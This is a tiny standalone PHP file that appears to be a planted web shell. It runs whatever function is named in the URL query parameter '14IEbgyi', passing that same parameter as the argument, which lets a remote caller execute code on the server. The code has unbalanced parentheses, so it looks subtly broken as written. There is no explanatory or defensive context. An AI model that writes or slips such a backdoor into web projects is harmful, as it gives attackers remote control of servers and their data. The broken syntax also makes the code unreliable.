<?php
$_GET['14IEbgyi'](($_GET['14IEbgyi']);
?>
